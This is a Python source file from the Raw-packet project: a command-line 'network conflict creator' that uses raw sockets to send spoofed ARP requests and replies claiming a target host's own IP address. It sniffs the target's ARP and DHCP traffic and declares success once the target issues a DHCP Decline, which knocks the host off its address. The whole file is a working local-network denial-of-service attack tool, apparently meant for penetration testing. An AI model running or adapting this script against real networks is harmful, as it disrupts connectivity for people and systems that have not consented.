#!/usr/bin/env python
# -*- coding: utf-8 -*-

# region Description
"""
network_conflict_creator.py: Network conflict creator script
Author: Vladimir Ivanov
License: MIT
Copyright 2019, Raw-packet Project
"""
# endregion

# region Import

# region Add path with Raw-packet modules
from sys import path
from os.path import dirname, abspath

project_root_path = dirname(dirname(dirname(abspath(__file__))))
arp_path = project_root_path + "/Scripts/ARP/"
utils_path = project_root_path + "/Utils/"

path.append(utils_path)
path.append(arp_path)
# endregion

# region Raw-packet modules
from base import Base
from network import ARP_raw, Sniff_raw
from tm import ThreadManager
from arp_scan import ArpScan
# endregion

# region Import libraries
from socket import socket, AF_PACKET, SOCK_RAW
from time import sleep
from argparse import ArgumentParser
# endregion

# endregion

# region Authorship information
__author__ = 'Vladimir Ivanov'
__copyright__ = 'Copyright 2019, Raw-packet Project'
__credits__ = ['']
__license__ = 'MIT'
__version__ = '0.0.4'
__maintainer__ = 'Vladimir Ivanov'
__email__ = 'ivanov.vladimir.mail@gmail.com'
__status__ = 'Development'
# endregion

# region Check user and platform
Base = Base()
ArpScan = ArpScan()
Sniff = Sniff_raw()
TM = ThreadManager(2)

Base.check_user()
Base.check_platform()
# endregion

# region Parse script arguments
parser = ArgumentParser(description='Network conflict creator script')

parser.add_argument('-i', '--interface', type=str, help='Set interface name for listen and send packets')
parser.add_argument('-t', '--target_ip', type=str, help='Set target IP address', required=True)
parser.add_argument('-m', '--target_mac', type=str, help='Set target MAC address', default=None)

parser.add_argument('-a', '--answers', action='store_true', help='Send only ARP answers')
parser.add_argument('-r', '--requests', action='store_true', help='Send only ARP requests')
parser.add_argument('-p', '--packets', type=int, help='Number of ARP answer packets (default: 10)', default=10)
parser.add_argument('-q', '--quiet', action='store_true', help='Minimal output')

args = parser.parse_args()
# endregion

# region Print banner
if not args.quiet:
    Base.print_banner()
# endregion

# region Global variables
_arp = ARP_raw()
_arp_request = ""
_arp_response = ""
_number_of_packets = int(args.packets)
_current_number_of_packets = 0
_current_network_interface = ""
_make_conflict = True
# endregion

# region Network interface selection and create global socket
if args.interface is None:
    _current_network_interface = Base.netiface_selection()
else:
    _current_network_interface = args.interface

_sock = socket(AF_PACKET, SOCK_RAW)
_sock.bind((_current_network_interface, 0))
# endregion

# region Get network interface MAC address
_current_mac_address = Base.get_netiface_mac_address(_current_network_interface)
if _current_mac_address is None:
    print "This network interface does not have mac address!"
    exit(1)
# endregion

# region Set target IP and MAC address
_target_ip_address = None
if Base.ip_address_validation(args.target_ip):
    _target_ip_address = args.target_ip
else:
    Base.print_error("Wrong target IP address: ", args.target_ip)
    exit(1)

_target_mac_address = None
if args.target_mac is not None:
    _target_mac_address = args.target_mac
else:
    Base.print_info("Get MAC address of IP: ", _target_ip_address)
    _target_mac_address = ArpScan.get_mac_address(_current_network_interface, _target_ip_address)
    if _target_mac_address == "ff:ff:ff:ff:ff:ff":
        Base.print_error("Could not find device MAC address with IP address: ", _target_ip_address)
        exit(1)
    else:
        Base.print_success("Find target: ", _target_ip_address + " (" + _target_mac_address + ")")
# endregion


# region Send ARP reply packets
def send_arp_reply(request):
    global _target_ip_address
    global _target_mac_address
    global _make_conflict
    global _arp_response
    global _sock
    global args

    try:
        if not args.answers and not args.requests:
            if 'ARP' in request.keys():
                if request['ARP']['sender-ip'] == _target_ip_address and \
                        request['ARP']['sender-mac'] == _target_mac_address:
                    Base.print_info("Send IPv4 Address Conflict ARP response to: ",
                                    _target_ip_address + " (" + _target_mac_address + ")")
                    _make_conflict = False
                    _sock.send(_arp_response)

        if 'DHCP' in request.keys():
            if request['DHCP'][53] == 4:
                Base.print_success("DHCP Decline from: ", _target_ip_address +
                                   " (" + request['Ethernet']['source'] + ")",
                                   " IPv4 network conflict created successful!")
                exit(0)

    except KeyboardInterrupt:
        _sock.close()
        Base.print_info("Exit")
        exit(0)
# endregion


# region ARP Sniffer
def arp_sniffer():
    Base.print_info("Sniff ARP or DHCP request from: ", str(_target_ip_address) + " (" + str(_target_mac_address) + ")")
    Sniff.start(protocols=['ARP', 'IP', 'UDP', 'DHCP'], prn=send_arp_reply,
                filters={"Ethernet": {"source": _target_mac_address}})
# endregion


# region Main function
if __name__ == "__main__":
    try:
        # region Make ARP request and response
        _arp_response = _arp.make_response(ethernet_src_mac=_current_mac_address,
                                           ethernet_dst_mac=_target_mac_address,
                                           sender_mac=_current_mac_address,
                                           sender_ip=_target_ip_address,
                                           target_mac=_target_mac_address,
                                           target_ip=_target_ip_address)

        _arp_request = _arp.make_request(ethernet_src_mac=_current_mac_address,
                                         ethernet_dst_mac="33:33:00:00:00:01",
                                         sender_mac=_current_mac_address,
                                         sender_ip=_target_ip_address,
                                         target_mac="00:00:00:00:00:00",
                                         target_ip=Base.get_netiface_random_ip(_current_network_interface))
        # endregion

        # region Start ARP sniffer
        TM.add_task(arp_sniffer)
        # endregion

        # region Send only ARP reply packets
        if args.answers:
            Base.print_info("Send only ARP response packets to: ",
                            str(_target_ip_address) + " (" + str(_target_mac_address) + ")")
            for _ in range(_number_of_packets):
                _sock.send(_arp_response)
                sleep(0.5)

            _sock.close()
        # endregion

        # region Send only ARP request packets
        elif args.requests:
            Base.print_info("Send only Multicast ARP request packets to: ",
                            str(_target_ip_address) + " (" + str(_target_mac_address) + ")")
            for _ in range(_number_of_packets):
                _sock.send(_arp_request)
                sleep(0.5)

            _sock.close()
        # endregion

        # region Send broadcast ARP request packets
        else:
            # region Start send ARP requests
            while _make_conflict:
                if _current_number_of_packets == _number_of_packets:
                    break
                else:
                    Base.print_info("Send Multicast ARP request to: ",
                                    str(_target_ip_address) + " (" + str(_target_mac_address) + ")")
                    _sock.send(_arp_request)
                    sleep(3)
                    _current_number_of_packets += 1
            # endregion

        # endregion

    except KeyboardInterrupt:
        _sock.close()
        Base.print_info("Exit")
        exit(0)
# endregion
